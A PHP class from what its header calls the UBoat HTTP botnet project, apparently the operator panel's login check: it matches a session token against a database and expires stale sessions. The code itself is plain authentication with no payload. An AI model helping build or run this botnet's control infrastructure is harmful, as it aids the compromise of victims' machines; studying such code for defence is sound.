<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class AuthVerify
{
    private $db;

    public function verify()
    {
        if (! isset($_SESSION['csrf']) || empty($_SESSION['csrf'])) {
            return ['Error' => 'No token found.'];
        }

        $this->db = new \PDO('mysql:host='.goat::$app->config['db']['host'].';dbname='.goat::$app->config['db']['dbname'], goat::$app->config['db']['username'], goat::$app->config['db']['password']);
        $t = [];
        $t[':t'] = bin2hex($_SESSION['csrf']);

        $st = $this->db->prepare('SELECT `auth_token` FROM `user` WHERE `auth_token` = :t');
        $st->execute($t);
        $result = $st->fetch();

        if (null == $result) {
            return ['Error' => 'Unable to authenticate, please retry or contact administration.'];
        }
        //check if expired
        $token = hex2bin($result['auth_token']);
        $expirate = explode('_', $token)[1];
        if (! isset($expirate[1])) {
            return ['Error' => 'Wrong token value.'];
        }

        if ($expirate < time()) {
            session_destroy();
            session_start();

            return ['Error' => 'Session expired, please relogin.'];
        }

        return true;
    }
}
